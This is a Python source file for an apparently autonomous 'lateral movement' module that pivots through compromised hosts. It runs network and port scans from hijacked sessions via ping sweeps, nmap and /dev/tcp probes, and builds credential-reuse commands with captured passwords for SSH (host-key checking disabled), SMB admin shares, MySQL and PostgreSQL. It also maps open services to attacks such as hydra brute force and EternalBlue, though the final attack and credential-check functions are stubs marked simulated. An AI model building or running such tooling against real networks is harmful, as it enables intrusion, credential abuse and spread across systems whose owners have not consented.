"""
Lateral Movement System
Enables autonomous network pivoting and multi-target exploitation
"""

import logging
import re
from typing import Dict, List, Optional
from session_store import Session, SessionType, SessionStatus, get_session_store
from autonomous_session_manager import autonomous_session_manager

class LateralMovement:
    """
    Handles autonomous lateral movement through compromised networks.
    """
    
    def __init__(self):
        self.session_store = get_session_store()
        self.discovered_hosts = {}  # session_id -> [list of discovered hosts]
        self.pivot_routes = []  # List of pivot paths through the network
    
    def pivot_scan(self, session_id: str, network_range: str, callback=None) -> List[Dict]:
        """
        Scan internal network from a compromised host.
        
        Args:
            session_id: The session to pivot from
            network_range: CIDR notation (e.g., "192.168.1.0/24")
            callback: Optional callback for updates
        
        Returns:
            List of discovered hosts with their services
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return []
        
        if callback:
            callback({'message': f'🔍 Pivot scanning {network_range} from session {session_id}...'})
        
        discovered = []
        
        # Run network scan from compromised host
        # Use lightweight tools available on most systems
        scan_commands = [
            f"for i in {{1..254}}; do ping -c 1 -W 1 {network_range.split('/')[0].rsplit('.', 1)[0]}.$i 2>/dev/null | grep 'bytes from' & done; wait",
            f"nmap -sn {network_range} 2>/dev/null || ping -c 1 {network_range.split('/')[0]}",
            f"arp -a 2>/dev/null"
        ]
        
        # Try each scan method
        for cmd in scan_commands:
            output = self._execute_in_session(session_id, cmd, callback)
            
            if output:
                hosts = self._parse_network_scan(output)
                discovered.extend(hosts)
                
                if hosts:
                    break  # Stop if we found hosts
        
        # Deduplicate
        unique_hosts = []
        seen_ips = set()
        
        for host in discovered:
            if host['ip'] not in seen_ips:
                seen_ips.add(host['ip'])
                unique_hosts.append(host)
        
        # Store discovered hosts
        if session_id not in self.discovered_hosts:
            self.discovered_hosts[session_id] = []
        
        self.discovered_hosts[session_id].extend(unique_hosts)
        
        if callback and unique_hosts:
            callback({'message': f'✅ Discovered {len(unique_hosts)} hosts in internal network'})
            for host in unique_hosts[:5]:  # Show first 5
                callback({'message': f'  📍 {host["ip"]} - {host.get("hostname", "unknown")}'})
        
        return unique_hosts
    
    def port_scan_pivot(self, session_id: str, target_ip: str, callback=None) -> Dict:
        """
        Perform port scan on an internal host from compromised session.
        
        Returns:
            Dictionary with open ports and services
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return {}
        
        if callback:
            callback({'message': f'🔎 Port scanning {target_ip} from pivot session...'})
        
        # Try different port scanning methods
        scan_methods = [
            f"nmap -p- -T4 {target_ip} 2>/dev/null",
            f"nc -zv {target_ip} 20-1000 2>&1",
            f"timeout 30 bash -c 'for port in 22 80 443 445 3389 3306 5432; do (echo >/dev/tcp/{target_ip}/$port) &>/dev/null && echo \"$port open\"; done'"
        ]
        
        open_ports = []
        
        for method in scan_methods:
            output = self._execute_in_session(session_id, method, callback)
            
            if output:
                ports = self._parse_port_scan(output)
                open_ports.extend(ports)
                
                if ports:
                    break
        
        result = {
            'target_ip': target_ip,
            'open_ports': open_ports,
            'pivot_session': session_id
        }
        
        if callback and open_ports:
            callback({'message': f'✅ Found {len(open_ports)} open ports on {target_ip}'})
            for port in open_ports[:5]:
                callback({'message': f'  🔓 Port {port["port"]}/{port["protocol"]} - {port["service"]}'})
        
        return result
    
    def credential_reuse(self, credentials: Dict, targets: List[str], callback=None) -> List[Dict]:
        """
        Test captured credentials against multiple targets.
        
        Args:
            credentials: Dict with 'username' and 'password'
            targets: List of target IPs
            callback: Optional callback
        
        Returns:
            List of successful authentications
        """
        username = credentials.get('username')
        password = credentials.get('password')
        
        if not username or not password:
            return []
        
        if callback:
            callback({'message': f'🔑 Testing credentials {username}:**** against {len(targets)} targets...'})
        
        successful_auths = []
        
        for target_ip in targets:
            # Try different protocols
            protocols = [
                ('ssh', 22, f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target_ip} 'whoami' 2>/dev/null"),
                ('rdp', 3389, None),  # Would require xfreerdp or similar
                ('smb', 445, f"smbclient //{target_ip}/C$ -U {username}%{password} -c 'ls' 2>/dev/null"),
                ('mysql', 3306, f"mysql -h {target_ip} -u {username} -p{password} -e 'SELECT 1;' 2>/dev/null"),
                ('postgres', 5432, f"PGPASSWORD='{password}' psql -h {target_ip} -U {username} -c 'SELECT 1;' 2>/dev/null")
            ]
            
            for protocol, port, command in protocols:
                if command is None:
                    continue
                
                # Execute test command
                # In a real implementation, this would run on the attacking machine or pivot host
                # For now, we'll simulate the logic
                
                success = self._test_credential(target_ip, port, username, password, protocol, callback)
                
                if success:
                    successful_auths.append({
                        'target_ip': target_ip,
                        'protocol': protocol,
                        'port': port,
                        'username': username,
                        'password': password
                    })
                    
                    if callback:
                        callback({'message': f'✅ Valid credentials: {username}@{target_ip} ({protocol})'})
                    
                    # Create a pending session
                    self._create_credential_session(target_ip, port, protocol, username, password)
                    
                    break  # Found valid creds for this host
        
        if callback and successful_auths:
            callback({'message': f'🎯 Credential reuse successful on {len(successful_auths)} targets'})
        
        return successful_auths
    
    def auto_lateral_move(self, from_session_id: str, target_ip: str, method: str = 'auto', callback=None) -> Optional[str]:
        """
        Automatically attempt to compromise a target using available methods.
        
        Args:
            from_session_id: Source session for pivoting
            target_ip: Target IP to compromise
            method: 'auto', 'exploit', 'credential', or specific method
        
        Returns:
            New session ID if successful, None otherwise
        """
        if callback:
            callback({'message': f'🎯 Attempting lateral movement to {target_ip}...'})
        
        # First, port scan the target
        port_scan_result = self.port_scan_pivot(from_session_id, target_ip, callback)
        open_ports = port_scan_result.get('open_ports', [])
        
        if not open_ports:
            if callback:
                callback({'message': f'❌ No open ports found on {target_ip}'})
            return None
        
        # Try different attack vectors based on open ports
        attack_vectors = []
        
        for port_info in open_ports:
            port = port_info['port']
            service = port_info['service']
            
            if port == 22 or 'ssh' in service.lower():
                attack_vectors.append(('ssh_bruteforce', port, 'hydra'))
            elif port == 445 or 'smb' in service.lower():
                attack_vectors.append(('smb_exploit', port, 'eternal_blue'))
            elif port == 3389 or 'rdp' in service.lower():
                attack_vectors.append(('rdp_bruteforce', port, 'hydra'))
            elif port in [80, 443, 8080] or 'http' in service.lower():
                attack_vectors.append(('web_exploit', port, 'auto'))
            elif port == 3306 or 'mysql' in service.lower():
                attack_vectors.append(('mysql_bruteforce', port, 'hydra'))
        
        # Try each attack vector
        for attack_type, port, tool in attack_vectors:
            if callback:
                callback({'message': f'🔨 Trying {attack_type} on port {port}...'})
            
            # Execute attack through pivot session
            success, new_session_id = self._execute_lateral_attack(
                from_session_id, target_ip, port, attack_type, tool, callback
            )
            
            if success and new_session_id:
                if callback:
                    callback({'message': f'✅ Lateral movement successful! Session: {new_session_id}'})
                
                # Record pivot route
                self.pivot_routes.append({
                    'from_session': from_session_id,
                    'to_session': new_session_id,
                    'target_ip': target_ip,
                    'method': attack_type
                })
                
                return new_session_id
        
        if callback:
            callback({'message': f'❌ All lateral movement attempts failed for {target_ip}'})
        
        return None
    
    def _execute_in_session(self, session_id: str, command: str, callback=None) -> str:
        """Execute a command in a session and return output."""
        return autonomous_session_manager._run_command(session_id, command, callback)
    
    def _parse_network_scan(self, output: str) -> List[Dict]:
        """Parse network scan output to extract discovered hosts."""
        hosts = []
        
        # Pattern for IP addresses
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        
        lines = output.split('\n')
        for line in lines:
            ip_match = re.search(ip_pattern, line)
            if ip_match:
                ip = ip_match.group(0)
                
                # Extract hostname if available
                hostname_match = re.search(r'from\s+(\S+)\s+\(' + re.escape(ip), line)
                hostname = hostname_match.group(1) if hostname_match else 'unknown'
                
                hosts.append({
                    'ip': ip,
                    'hostname': hostname,
                    'raw_line': line.strip()
                })
        
        return hosts
    
    def _parse_port_scan(self, output: str) -> List[Dict]:
        """Parse port scan output to extract open ports."""
        ports = []
        
        # Nmap format: 22/tcp open ssh
        nmap_pattern = r'(\d+)/(tcp|udp)\s+open\s+(\S+)'
        
        # Netcat format: Connection to 192.168.1.1 22 port [tcp/ssh] succeeded!
        nc_pattern = r'(\d+)\s+port.*?succeeded'
        
        # Bash format: 22 open
        bash_pattern = r'(\d+)\s+open'
        
        for line in output.split('\n'):
            # Try nmap format
            match = re.search(nmap_pattern, line)
            if match:
                ports.append({
                    'port': int(match.group(1)),
                    'protocol': match.group(2),
                    'service': match.group(3)
                })
                continue
            
            # Try netcat format
            match = re.search(nc_pattern, line)
            if match:
                port = int(match.group(1))
                service = self._guess_service(port)
                ports.append({
                    'port': port,
                    'protocol': 'tcp',
                    'service': service
                })
                continue
            
            # Try bash format
            match = re.search(bash_pattern, line)
            if match:
                port = int(match.group(1))
                service = self._guess_service(port)
                ports.append({
                    'port': port,
                    'protocol': 'tcp',
                    'service': service
                })
        
        return ports
    
    def _guess_service(self, port: int) -> str:
        """Guess service based on common port numbers."""
        common_ports = {
            22: 'ssh', 21: 'ftp', 80: 'http', 443: 'https',
            3389: 'rdp', 445: 'smb', 139: 'netbios',
            3306: 'mysql', 5432: 'postgres', 1433: 'mssql',
            8080: 'http-proxy', 8443: 'https-alt'
        }
        return common_ports.get(port, 'unknown')
    
    def _test_credential(self, target_ip: str, port: int, username: str, password: str, protocol: str, callback=None) -> bool:
        """Test if credentials are valid for a target (simulated)."""
        # In a real implementation, this would actually test the credentials
        # For now, we return False to avoid unintended authentication attempts
        return False
    
    def _create_credential_session(self, target_ip: str, port: int, protocol: str, username: str, password: str):
        """Create a pending session from captured credentials."""
        from session_store import Session, SessionType, SessionStatus
        
        session = Session(
            session_type=SessionType.CREDENTIAL,
            status=SessionStatus.PENDING,
            target_ip=target_ip,
            target_port=port,
            protocol=protocol,
            username=username,
            password=password,
            source_tool='lateral_movement',
            capabilities=['pending_upgrade']
        )
        
        self.session_store.add_session(session)
    
    def _execute_lateral_attack(self, from_session_id: str, target_ip: str, port: int, 
                                attack_type: str, tool: str, callback=None) -> tuple:
        """Execute a lateral movement attack (simulated for safety)."""
        # In a real implementation, this would execute actual attacks
        # For safety, this is a simulation that returns False
        return False, None
    
    def get_network_map(self) -> Dict:
        """Get a map of the compromised network."""
        network_map = {
            'pivot_sessions': [],
            'discovered_hosts': {},
            'pivot_routes': self.pivot_routes,
            'total_compromised': self.session_store.get_summary()['total_sessions']
        }
        
        # Add session information
        for session in self.session_store.list_sessions():
            if session.status == SessionStatus.ACTIVE:
                network_map['pivot_sessions'].append({
                    'session_id': session.session_id,
                    'target_ip': session.target_ip,
                    'session_type': session.session_type.value
                })
        
        # Add discovered hosts
        network_map['discovered_hosts'] = self.discovered_hosts
        
        return network_map

# Singleton instance
lateral_movement = LateralMovement()
